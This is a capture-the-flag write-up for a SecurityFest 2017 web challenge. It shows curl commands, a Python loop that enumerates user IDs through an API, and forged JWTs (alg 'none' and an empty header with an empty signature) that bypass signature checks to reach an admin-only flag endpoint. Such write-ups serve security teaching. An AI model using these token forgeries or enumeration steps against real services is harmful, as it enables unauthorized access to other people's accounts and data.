---
private: 'false'
layout: post
featured: false
published: true
comments: true
title: SecurityFest2017 - Underconstruction
tags: JWT
mathjax: false
#imagefeature: /images/express.jpg
description: SecurityFest2017 - Underconstruction
category: Web Exploitation
chart: null
---


## Problems

```
Under Construction! Please protect your head, wear a hardhat.
Solves: 12
Service: http://web.ctf.rocks:8080
Author: Kits / weckzen
```


## Writeup

at this web challenges we can read in the source code at root path

```html
<!-- I don't know the status of the front end but the back end is coming along nicely. Try /login with {"username": "user", "password":"password"} -->
```

using this curl to login 
```
➔ curl -H "Content-Type: application/json" \
-X POST -d '{"username":"user","password":"password"}' \
http://web.ctf.rocks:8080/login
```

and we get this response 
```
< HTTP/1.1 200 
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< Cache-Control: no-cache, no-store, max-age=0, must-revalidate
< Pragma: no-cache
< Expires: 0
< X-Frame-Options: DENY
< Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY
< Content-Length: 51
< Date: Fri, 02 Jun 2017 03:23:30 GMT
< 
* Connection #0 to host web.ctf.rocks left intact
{"userId":"52","authorizedURLs":["/login","/apis"]}
```

information we get is UserID:52 and authorizedURLs: ['/login','/apis'] , and we got authorization header 
with JWT (Json Web Token).

`eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY`
jwt have 3 part `<header>.<payload>.<signature>` 

```
Header : 
➔ echo -n eyJhbGciOiJIUzI1NiJ9 | base64 -d
{"alg":"HS256"}% 

Payload : 
➔ echo -n eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0 | base64 -d
{"user":"user","exp":1497237810}

Signature :
*Signature is constructed using this algorithm 

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
secret
)

*Concatenating base64 header and payload with "." and encrypt with some custom secret string

```

let's trying what /apis endoint does with this curl.

```
➔ curl -H "Content-Type: application/json" \
-X GET \         
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY' http://web.ctf.rocks:8080/apis
{"timestamp":1496374182620,"status":400,"error":"Bad Request","exception":"org.springframework.web.bind.MissingServletRequestParameterException","message":"Required Integer parameter 'userId' is not present","path":"/apis"}% 
```

missing parameter `userId`

```
➔ curl -H "Content-Type: application/json" \
-X GET \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY' "http://web.ctf.rocks:8080/apis?userId=52" 
{"urls":["/login","/apis"],"id":52,"user":"user"}
```

using some python to enumurate other users urls.

```python
import requests
import json

url = "http://web.ctf.rocks:8080/apis"



payload = "{\"username\": \"user\", \"password\":\"password\"}"
headers = {
    'content-type': "application/json",
    'cookie': "JSESSIONID=4B17338B92DFAF214BAF7D40F29FC561",
    'authorization': "Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzA5ODI2MH0.FwX2y37d7C1eQdiLgrsyCoWc-PbMb_O4KfKT3KtpQZw",
    'cache-control': "no-cache",
    'postman-token': "c8908859-4423-0bf5-1049-db1bc7ffcc27"
    }


for x in range(100):
    querystring = {"userId":x}
    response = requests.request("GET", url, data=payload, headers=headers, params=querystring)
    result = json.loads(response.text)
    print(result['urls'], x, result['user'])
```

get this result

```
([u'/login', u'/apis', u'/supersecretflagresource'], 0, u'admin')
([u'/login', u'/apis'], 1, u'Patrik')
([u'/login', u'/apis'], 2, u'Joakim')
([u'/login', u'/apis'], 3, u'Joakim')
([u'/login', u'/apis'], 4, u'Joakim')
([u'/login', u'/apis'], 5, u'Joakim')
([u'/login', u'/apis'], 6, u'Joakim')
([u'/login', u'/apis'], 7, u'Joakim')
([u'/login', u'/apis'], 8, u'Joakim')
([u'/login', u'/apis'], 9, u'Joakim')
([u'/login', u'/apis'], 10, u'Joakim')
```

we got some interesting urls `/supersecretflagresource`.
but we can't access it directly because they validating our Authorization header JWT is not Admin

```
➔ curl -H "Content-Type: application/json" \
-X GET \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY' "http://web.ctf.rocks:8080/supersecretflagresource" 
{"timestamp":1496374542889,"status":403,"error":"Forbidden","message":"Access is denied","path":"/supersecretflagresource"}
```

I am not solving this while the competition but trying to documenting this is a good challenge.
if we change the JWT payload part to `{"user":"admin","exp":1497237810}` this will trigger exception because
the signature validation is error.

```
➔ curl -H "Content-Type: application/json" \
-X GET \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcyMzc4MTB9.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq' "http://web.ctf.rocks:8080/supersecretflagresource" 
{"timestamp":1496374872312,"status":500,"error":"Internal Server Error","exception":"io.jsonwebtoken.SignatureException","message":"JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.","path":"/supersecretflagresource"}
```

so after reading some writeup there are 2 ways to bypass this restriction :
1. change the header algorithm to none and empty signature the payload `{"user":"admin","exp":1497099449}` `<header>.<payload>.`
2. using empty header and empty signature and change the payload to `{"user":"admin","exp":1497099449}` `.<payload>.`

the first way
```
➔ curl -H "Content-Type: application/json" \
-X GET \
-H 'Authorization: Bearer eyJhbGciOiJub25lIn0_.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcwOTk0NDl9.' "http://web.ctf.rocks:8080/supersecretflagresource"
{"message":"You are close now","script":"function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}","url":"https://kits.se?kokitotsos"}
```

second way
```
➔ curl -H "Content-Type: application/json" \
-X GET \
-H 'Authorization: Bearer .eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcwOTk0NDl9.' "http://web.ctf.rocks:8080/supersecretflagresource"
{"message":"You are close now","script":"function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}","url":"https://kits.se?kokitotsos"}
```

i am prefer the second way from here `https://losfuzzys.github.io/writeup/2017/05/31/SCTF2017-underconstruction/`
and the author say will remove the confusing part at v1.0 `https://github.com/jwtk/jjwt/issues/212`

so to get the flag just open `https://kits.se?kokitotsos` and fire up console run the javascript function

```js
function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}
```


*Nb : i am trying >12Hour cracking the password of signature to construct a valid signature but got nothing

Flag : `SCTF{lolKOKITOTSOS}`